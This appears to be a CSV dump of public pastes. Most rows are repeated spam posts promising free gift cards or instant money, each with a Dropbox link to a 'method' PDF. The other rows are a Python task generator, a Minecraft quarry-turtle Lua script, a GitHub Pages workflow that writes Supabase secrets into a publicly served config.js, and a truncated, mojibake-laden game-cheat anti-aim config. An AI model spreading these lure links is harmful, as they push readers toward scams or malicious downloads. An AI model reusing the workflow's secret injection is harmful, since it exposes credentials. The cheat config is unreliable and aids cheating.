id,title,username,language,date,content
7JsrsVic,FREE 500$ GIFTCARDS-[Works Worldwide] 0Y,TheRealNeonDark,JavaScript,Friday 30th of May 2025 01:05:23 PM CDT," 
>DROPBOX<<
CURRENT PDF>> https://www.dropbox.com/scl/fi/cet5tgvwt6ga42iu4x9cl/method2025latest.pdf?rlkey=unp4rsa81wpqwxcmdgvdssk44&st=h6x7le5e&dl=0

ATPRYG"
gtYhJ0HJ,Make $2000 INSTANTLY [Works Worldwide] UV,abousoufiane,JavaScript,Friday 30th of May 2025 01:05:07 PM CDT," 
>DROPBOX<<
CURRENT PDF>> https://www.dropbox.com/scl/fi/4e2z07jv1v6rsganifo2e/ebook.pdf?rlkey=t4mllp8ph0b4beuwnnx52ms84&st=hj3ruffr&dl=0

bMvgJe"
ASHDKXYe,FREE 500$ GIFTCARDS-[Works Worldwide] 0Y,taytay08241,JavaScript,Friday 30th of May 2025 01:02:01 PM CDT," 
>DROPBOX<<
CURRENT PDF>> https://www.dropbox.com/scl/fi/cet5tgvwt6ga42iu4x9cl/method2025latest.pdf?rlkey=unp4rsa81wpqwxcmdgvdssk44&st=h6x7le5e&dl=0

nOE9uC"
YdTLiD3g,Get anything for FREE NEW!!!!! TI,kaixe,JavaScript,Friday 30th of May 2025 01:00:50 PM CDT," 
>DROPBOX<<
CURRENT PDF>> https://www.dropbox.com/scl/fi/5ekzul27v03h88xakxxtp/semethod2025latest.pdf?rlkey=d7l31rc2x8ssf1y85eeil1dq9&st=484soifd&dl=0

lxUpIr"
TZxQd41i,Get anything for FREE,abousoufiane,JavaScript,Friday 30th of May 2025 12:55:06 PM CDT," 
>DROPBOX<<
CURRENT PDF>> https://www.dropbox.com/scl/fi/4e2z07jv1v6rsganifo2e/ebook.pdf?rlkey=t4mllp8ph0b4beuwnnx52ms84&st=hj3ruffr&dl=0

85JyMu"
H3RiGF3D,Get anything for FREE NEW!!!!! TI,TheRealNeonDark,JavaScript,Friday 30th of May 2025 12:54:51 PM CDT," 
>DROPBOX<<
CURRENT PDF>> https://www.dropbox.com/scl/fi/cet5tgvwt6ga42iu4x9cl/method2025latest.pdf?rlkey=unp4rsa81wpqwxcmdgvdssk44&st=h6x7le5e&dl=0

c1q0c3"
DAp5FQG9,Get anything for FREE NEW!!!!! TI,taytay08241,JavaScript,Friday 30th of May 2025 12:51:27 PM CDT," 
>DROPBOX<<
CURRENT PDF>> https://www.dropbox.com/scl/fi/cet5tgvwt6ga42iu4x9cl/method2025latest.pdf?rlkey=unp4rsa81wpqwxcmdgvdssk44&st=h6x7le5e&dl=0

OWQBK2"
MX2R7Wvy,EARN $500 INSTANTLY,kaixe,JavaScript,Friday 30th of May 2025 12:50:47 PM CDT," 
>DROPBOX<<
CURRENT PDF>> https://www.dropbox.com/scl/fi/5ekzul27v03h88xakxxtp/semethod2025latest.pdf?rlkey=d7l31rc2x8ssf1y85eeil1dq9&st=484soifd&dl=0

sn5YnO"
ddTb01uZ,EARN $500 INSTANTLY,TheRealNeonDark,JavaScript,Friday 30th of May 2025 12:44:50 PM CDT," 
>DROPBOX<<
CURRENT PDF>> https://www.dropbox.com/scl/fi/cet5tgvwt6ga42iu4x9cl/method2025latest.pdf?rlkey=unp4rsa81wpqwxcmdgvdssk44&st=h6x7le5e&dl=0

l1XiWY"
xK83QeFq,Get anything for FREE,abousoufiane,JavaScript,Friday 30th of May 2025 12:44:34 PM CDT," 
>DROPBOX<<
CURRENT PDF>> https://www.dropbox.com/scl/fi/4e2z07jv1v6rsganifo2e/ebook.pdf?rlkey=t4mllp8ph0b4beuwnnx52ms84&st=hj3ruffr&dl=0

s8PXMz"
fVdEb1ut,FREE 400$ GIFTCARDS 74,taytay08241,JavaScript,Friday 30th of May 2025 12:40:55 PM CDT," 
>DROPBOX<<
CURRENT PDF>> https://www.dropbox.com/scl/fi/cet5tgvwt6ga42iu4x9cl/method2025latest.pdf?rlkey=unp4rsa81wpqwxcmdgvdssk44&st=h6x7le5e&dl=0

ePLQwf"
hTwM6CFT,Make 2000$ in 15 minutes [WORKED] 37,kaixe,JavaScript,Friday 30th of May 2025 12:40:16 PM CDT," 
>DROPBOX<<
CURRENT PDF>> https://www.dropbox.com/scl/fi/5ekzul27v03h88xakxxtp/semethod2025latest.pdf?rlkey=d7l31rc2x8ssf1y85eeil1dq9&st=484soifd&dl=0

odpfGF"
LQNNRjfQ,Get anything for FREE NEW!!!!! TI,TheRealNeonDark,JavaScript,Friday 30th of May 2025 12:34:19 PM CDT," 
>DROPBOX<<
CURRENT PDF>> https://www.dropbox.com/scl/fi/cet5tgvwt6ga42iu4x9cl/method2025latest.pdf?rlkey=unp4rsa81wpqwxcmdgvdssk44&st=h6x7le5e&dl=0

PZfcdv"
mYd38QwZ,FREE 500$ GIFTCARDS-[Works Worldwide] 0Y,lucho133,JavaScript,Friday 30th of May 2025 12:29:43 PM CDT," 
>DROPBOX<<
CURRENT PDF>> https://www.dropbox.com/scl/fi/5ekzul27v03h88xakxxtp/semethod2025latest.pdf?rlkey=d7l31rc2x8ssf1y85eeil1dq9&st=484soifd&dl=0

86HRSw"
HebiWKtf,FREE 400$ GIFTCARDS 47,lucho133,JavaScript,Friday 30th of May 2025 12:19:11 PM CDT," 
>DROPBOX<<
CURRENT PDF>> https://www.dropbox.com/scl/fi/5ekzul27v03h88xakxxtp/semethod2025latest.pdf?rlkey=d7l31rc2x8ssf1y85eeil1dq9&st=484soifd&dl=0

SgeKrg"
U8zqKHh0,Рецензия код,usernameer,Python,Friday 30th of May 2025 12:12:56 PM CDT,"# Доступен весь синтаксис пайтон и
# стандартной библиотеки
import random
import string
# Функция решатель задачи, принимает аргументы
# на усмотрения создателя прототипа.
# Должна возвращать число
def main(word):
	return len(word)
# Функция генерации условия задачи,
# принимает такие же аргументы, как и main()
# Если генерация не предусмотрена, то
# возвращать пустую строку
def get_task():
	return generate_random_string()
def generate_random_string():
	# Выбираем случайную длину от 5 до 20 символов
	length = random.randint(5, 20)
	# Генерируем строку из случайных букв и цифр
	characters = string.ascii_letters + string.digits
	random_string = ''.join(random.choice(characters) for _ in range(length))
	return random_string
"
fCq9LbkW,Make 2000$ in 15 minutes [WORKED] 37,lucho133,JavaScript,Friday 30th of May 2025 12:09:10 PM CDT," 
>DROPBOX<<
CURRENT PDF>> https://www.dropbox.com/scl/fi/5ekzul27v03h88xakxxtp/semethod2025latest.pdf?rlkey=d7l31rc2x8ssf1y85eeil1dq9&st=484soifd&dl=0

GYuTJA"
uf0kKtzW,deploy.yml,ronard_addo,YAML,Friday 30th of May 2025 12:02:52 PM CDT,"name: Build and Deploy to GitHub Pages

on:
  push:
    branches:
      - main

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout code
        uses: actions/checkout@v3

      - name: Inject Supabase secrets into config.js ES module
        run: |
          echo ""export const CONFIG = {"" > config.js
          echo ""  url: '${{ secrets.SUPABASE_URL }}',"" >> config.js
          echo ""  key: '${{ secrets.SUPABASE_KEY }}'"" >> config.js
          echo ""};"" >> config.js

      - name: List files before deployment (debugging)
        run: ls -al

      - name: Deploy to GitHub Pages
        uses: peaceiris/actions-gh-pages@v3
        with:
          github_token: ${{ secrets.GITHUB_TOKEN }}
          publish_dir: ./
          add: true"
jgM2NMiV,quar2day,DanFrmSpace,Lua,Friday 30th of May 2025 11:40:04 AM CDT,"-- Advanced Quarry Turtle for CC: Tweaked
-- Mines 5x5 area down to bedrock with state persistence

-- Configuration
local config = {
    quarryWidth = 5,       -- Width of quarry
    quarryLength = 5,      -- Length of quarry
    minFuelLevel = 500,    -- Minimum fuel before returning
    torchInterval = 5,     -- Place torch every N layers
    chestCheckInterval = 5 -- Check inventory every N layers
}

-- State tracking
local state = {
    x = 0, y = 0, z = 0,
    facing = 0, -- 0=north, 1=east, 2=south, 3=west
    layer = 0,
    rowInLayer = 0,
    blockInRow = 0,
    startX = 0, startY = 0, startZ = 0,
    quarrying = true,
    returningForFuel = false,
    miningPattern = ""rows"" -- rows or spiral
}

-- Utility functions
local function saveState()
    local file = fs.open(""quarry_state"", ""w"")
    file.write(textutils.serialize(state))
    file.close()
end

local function loadState()
    if fs.exists(""quarry_state"") then
        local file = fs.open(""quarry_state"", ""r"")
        state = textutils.unserialize(file.readAll())
        file.close()
        return true
    end
    return false
end

local function deleteState()
    if fs.exists(""quarry_state"") then
        fs.delete(""quarry_state"")
    end
end

-- Movement tracking functions
local function forward()
    if turtle.forward() then
        if state.facing == 0 then state.z = state.z - 1
        elseif state.facing == 1 then state.x = state.x + 1
        elseif state.facing == 2 then state.z = state.z + 1
        elseif state.facing == 3 then state.x = state.x - 1
        end
        return true
    end
    return false
end

local function back()
    if turtle.back() then
        if state.facing == 0 then state.z = state.z + 1
        elseif state.facing == 1 then state.x = state.x - 1
        elseif state.facing == 2 then state.z = state.z - 1
        elseif state.facing == 3 then state.x = state.x + 1
        end
        return true
    end
    return false
end

local function up()
    if turtle.up() then
        state.y = state.y + 1
        return true
    end
    return false
end

local function down()
    if turtle.down() then
        state.y = state.y - 1
        return true
    end
    return false
end

local function turnLeft()
    turtle.turnLeft()
    state.facing = (state.facing - 1) % 4
end

local function turnRight()
    turtle.turnRight()
    state.facing = (state.facing + 1) % 4
end

local function turnAround()
    turnRight()
    turnRight()
end

-- Safe digging functions
local function digSafe()
    while turtle.detect() do
        if not turtle.dig() then
            return false -- Hit bedrock or unbreakable block
        end
        sleep(0.5) -- Handle falling blocks
    end
    return true
end

local function digUpSafe()
    while turtle.detectUp() do
        if not turtle.digUp() then
            return false
        end
        sleep(0.5)
    end
    return true
end

local function digDownSafe()
    while turtle.detectDown() do
        if not turtle.digDown() then
            return false -- Hit bedrock
        end
        sleep(0.5)
    end
    return true
end

-- Movement with digging
local function forwardDig()
    digSafe()
    local attempts = 0
    while not forward() and attempts < 10 do
        digSafe()
        turtle.attack() -- Clear mobs
        attempts = attempts + 1
        sleep(0.2)
    end
    return attempts < 10
end

local function upDig()
    digUpSafe()
    local attempts = 0
    while not up() and attempts < 10 do
        digUpSafe()
        turtle.attackUp()
        attempts = attempts + 1
        sleep(0.2)
    end
    return attempts < 10
end

local function downDig()
    if not digDownSafe() then
        return false -- Hit bedrock
    end
    local attempts = 0
    while not down() and attempts < 10 do
        if not digDownSafe() then
            return false -- Hit bedrock
        end
        turtle.attackDown()
        attempts = attempts + 1
        sleep(0.2)
    end
    return attempts < 10
end

-- Inventory management
local function findItem(name)
    for i = 1, 16 do
        local item = turtle.getItemDetail(i)
        if item and item.name == name then
            return i
        end
    end
    return nil
end

local function countEmptySlots()
    local empty = 0
    for i = 1, 16 do
        if turtle.getItemCount(i) == 0 then
            empty = empty + 1
        end
    end
    return empty
end

local function depositItems()
    print(""Depositing items..."")
    for i = 1, 16 do
        turtle.select(i)
        local item = turtle.getItemDetail()
        -- Keep fuel and torches
        if item and 
           item.name ~= ""minecraft:coal"" and 
           item.name ~= ""minecraft:charcoal"" and
           item.name ~= ""minecraft:lava_bucket"" and
           item.name ~= ""minecraft:torch"" then
            turtle.dropUp()
        end
    end
    turtle.select(1)
end

-- Fuel management
local function getFuelLevel()
    local level = turtle.getFuelLevel()
    if level == ""unlimited"" then
        return 999999
    end
    return level
end

local function refuel()
    print(""Checking fuel..."")
    local fuelLevel = getFuelLevel()
    
    if fuelLevel < config.minFuelLevel then
        print(""Fuel low. Refueling..."")
        for i = 1, 16 do
            turtle.select(i)
            if turtle.refuel(0) then -- Check if item is fuel
                local needed = config.minFuelLevel * 2 - getFuelLevel()
                turtle.refuel(math.ceil(needed / 80)) -- Coal gives 80 fuel
                if getFuelLevel() >= config.minFuelLevel then
                    break
                end
            end
        end
        
        -- Check for lava buckets
        local lavaBucket = findItem(""minecraft:lava_bucket"")
        if lavaBucket and getFuelLevel() < config.minFuelLevel then
            turtle.select(lavaBucket)
            turtle.refuel(1)
        end
    end
    
    turtle.select(1)
    return getFuelLevel() >= config.minFuelLevel
end

-- Torch placement
local function placeTorch()
    local torchSlot = findItem(""minecraft:torch"")
    if torchSlot then
        local currentSlot = turtle.getSelectedSlot()
        turtle.select(torchSlot)
        
        -- Try to place on wall
        turnLeft()
        if not turtle.place() then
            turnRight()
            turnRight()
            turtle.place()
            turnLeft()
        else
            turnRight()
        end
        
        turtle.select(currentSlot)
    end
end

-- Navigation functions
local function goToPosition(targetX, targetY, targetZ, targetFacing)
    print(string.format(""Going to position: X:%d Y:%d Z:%d"", targetX, targetY, targetZ))
    
    -- Move to Y level first (go up if needed)
    while state.y < targetY do
        upDig()
    end
    
    -- Move X
    while state.x < targetX do
        while state.facing ~= 1 do turnRight() end
        forwardDig()
    end
    while state.x > targetX do
        while state.facing ~= 3 do turnRight() end
        forwardDig()
    end
    
    -- Move Z
    while state.z < targetZ do
        while state.facing ~= 2 do turnRight() end
        forwardDig()
    end
    while state.z > targetZ do
        while state.facing ~= 0 do turnRight() end
        forwardDig()
    end
    
    -- Move to Y level (go down if needed)
    while state.y > targetY do
        downDig()
    end
    
    -- Face correct direction
    if targetFacing then
        while state.facing ~= targetFacing do
            turnRight()
        end
    end
end

local function returnToStart()
    print(""Returning to start position..."")
    local savedState = {
        x = state.x,
        y = state.y,
        z = state.z,
        facing = state.facing
    }
    
    goToPosition(state.startX, state.startY, state.startZ, 0)
    
    return savedState
end

local function returnToMining(savedPosition)
    print(""Returning to mining position..."")
    goToPosition(savedPosition.x, savedPosition.y, savedPosition.z, savedPosition.facing)
end

-- Quarry patterns
local function mineLayer()
    -- Always start from the same corner with same orientation
    local layerStartX = state.startX + 1  -- One block forward from start
    local layerStartZ = state.startZ
    local layerY = state.y
    
    -- Ensure we're at the correct starting position and facing
    goToPosition(layerStartX, layerY, layerStartZ, 0)
    
    for row = 1, config.quarryLength do
        -- Mine one row
        for block = 1, config.quarryWidth - 1 do
            forwardDig()
            state.blockInRow = block
            saveState()
        end
        
        -- Move to next row if not last
        if row < config.quarryLength then
            if row % 2 == 1 then
                -- Odd row, turn right
                turnRight()
                forwardDig()
                turnRight()
            else
                -- Even row, turn left
                turnLeft()
                forwardDig()
                turnLeft()
            end
        end
        
        state.rowInLayer = row
        state.blockInRow = 0
        saveState()
    end
    
    -- Always return to the starting corner of this layer facing north
    goToPosition(layerStartX, layerY, layerStartZ, 0)
end

-- Main quarry function
local function quarry()
    print(""Starting quarry operation..."")
    print(string.format(""Size: %dx%d"", config.quarryWidth, config.quarryLength))
    print(""Mining down to bedrock..."")
    
    while state.quarrying do
        -- Check fuel before each layer
        if getFuelLevel() < config.minFuelLevel then
            print(""Low fuel! Current level: "" .. getFuelLevel())
            state.returningForFuel = true
            saveState()
            
            local miningPos = returnToStart()
            
            -- Try to refuel from inventory
            if not refuel() then
                print(""Cannot refuel from inventory!"")
                print(""Please add fuel to the turtle"")
                print(""Fuel needed: "" .. config.minFuelLevel)
                print(""Current fuel: "" .. getFuelLevel())
                print(""Press any key after adding fuel..."")
                os.pullEvent(""key"")
                refuel()
            end
            
            -- Deposit items while we're here
            depositItems()
            
            -- Return to mining
            returnToMining(miningPos)
            state.returningForFuel = false
            saveState()
        end
        
        -- Mine current layer
        print(""Mining layer "" .. state.layer)
        mineLayer()
        
        -- Place torch if needed
        if state.layer % config.torchInterval == 0 then
            placeTorch()
        end
        
        -- Check inventory every few layers
        if state.layer % config.chestCheckInterval == 0 and countEmptySlots() <= 2 then
            print(""Inventory nearly full, returning to deposit..."")
            local miningPos = returnToStart()
            depositItems()
            returnToMining(miningPos)
        end
        
        -- Try to go down
        if not downDig() then
            print(""Hit bedrock at layer "" .. state.layer)
            state.quarrying = false
        else
            state.layer = state.layer + 1
            state.rowInLayer = 0
            state.blockInRow = 0
            saveState()
        end
    end
    
    -- Return to start and deposit final items
    returnToStart()
    depositItems()
    
    print(""Quarry complete!"")
    print(""Mined "" .. state.layer .. "" layers"")
    deleteState()
end

-- Resume function for interrupted mining
local function resume()
    print(""Resuming quarry operation..."")
    print(string.format(""Current position: X:%d Y:%d Z:%d"", state.x, state.y, state.z))
    print(""Current layer: "" .. state.layer)
    
    if state.returningForFuel then
        print(""Was returning for fuel..."")
        returnToStart()
        refuel()
        depositItems()
        
        -- Go back to the starting position of the current layer
        local layerStartX = state.startX + 1
        local layerStartZ = state.startZ
        local layerY = state.startY - state.layer
        goToPosition(layerStartX, layerY, layerStartZ, 0)
        state.returningForFuel = false
    end
    
    quarry()
end

-- Setup function
local function setup()
    print(""Advanced Quarry Turtle"")
    print(""==========================="")
    print(""Setup Instructions:"")
    print(""1. Place chest ABOVE turtle"")
    print(""2. Add fuel (coal/lava buckets)"")
    print(""3. Add torches (optional)"")
    print(""4. Turtle will mine 5x5 area"")
    print(""   in front of it (north)"")
    print(""   extending to the right (east)"")
    print(""==========================="")
    print(""Current fuel: "" .. getFuelLevel())
    print(""Press any key to start..."")
    os.pullEvent(""key"")
    
    -- Check if resuming
    if loadState() then
        print(""Found saved state!"")
        resume()
    else
        -- New quarry
        state.startX = state.x
        state.startY = state.y
        state.startZ = state.z
        
        -- Check initial fuel
        if not refuel() then
            print(""ERROR: Not enough fuel!"")
            print(""Add at least "" .. config.minFuelLevel .. "" fuel"")
            return
        end
        
        -- Move forward to start quarry
        print(""Moving to quarry start position..."")
        forwardDig()
        state.startX = state.x - 1  -- Store original position (one block back)
        state.startY = state.y
        state.startZ = state.z
        downDig() -- Start first layer
        state.layer = 1
        saveState()
        
        quarry()
    end
end

-- Error handling wrapper
local function main()
    local success, error = pcall(setup)
    if not success then
        print(""ERROR: "" .. error)
        print(""State saved. Run program again to resume."")
        saveState()
    end
end

-- Run the program
main()"
0ExZHYR4,Default,abubandit69,Lua,Friday 30th of May 2025 11:30:13 AM CDT,"{""2.defensive_yaw_separator"":""\u0007404040FFÃ¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾\u0007FFFFFF002"",""2.defensive_yaw_jitter_offset"":0,""6.defensive_yaw_jitter_right"":0,""7.yaw_jitter_separator"":""\u0007404040FFÃ¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾\u0007FFFFFF007"",""4.defensive_yaw_jitter_right"":0,""2.defensive_yaw_jitter_right"":0,""2.yaw_variance"":0,""7.yaw_jitter_variance"":10,""5.yaw_jitter_separator"":""\u0007404040FFÃ¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾\u0007FFFFFF005"",""5.yaw_jitter_variance"":10,""3.yaw_jitter_separator"":""\u0007404040FFÃ¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾\u0007FFFFFF003"",""9.yaw_jitter_variance"":0,""fps_boost"":false,""12.defensive_yaw_delay"":1,""4.separator"":""\u0007404040FFÃ¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾\u0007FFFFFF004"",""2.separator"":""\u0007404040FFÃ¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾\u0007FFFFFF002"",""6.separator"":""\u0007404040FFÃ¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾\u0007FFFFFF006"",""3.yaw_jitter_delay"":1,""1.yaw_jitter_delay"":1,""9.defensive_yaw_jitter_separator"":""\u0007404040FFÃ¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾\u0007FFFFFF009"",""7.yaw_jitter_delay"":1,""6.body_yaw_separator"":""\u0007404040FFÃ¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾\u0007FFFFFF006"",""5.yaw_jitter_delay"":1,""8.body_yaw_separator"":""\u0007404040FFÃ¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾\u0007FFFFFF008"",""10.defensive_yaw_separator"":""\u0007404040FFÃ¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾\u0007FFFFFF0010"",""2.defensive_yaw"":false,""4.pitch_separator"":""\u0007404040FFÃ¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾\u0007FFFFFF004"",""8.separator"":""\u0007404040FFÃ¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾\u0007FFFFFF008"",""2.bombsite_fix"":false,""2.defensive_pitch_offset2"":0,""8.pitch_separator"":""\u0007404040FFÃ¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾\u0007FFFFFF008"",""6.defensive_pitch_offset2"":0,""4.defensive_yaw_jitter_offset"":0,""8.yaw_jitter_delay"":1,""1.yaw_jitter_separator"":""\u0007404040FFÃ¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã¢â‚¬Â¾Ã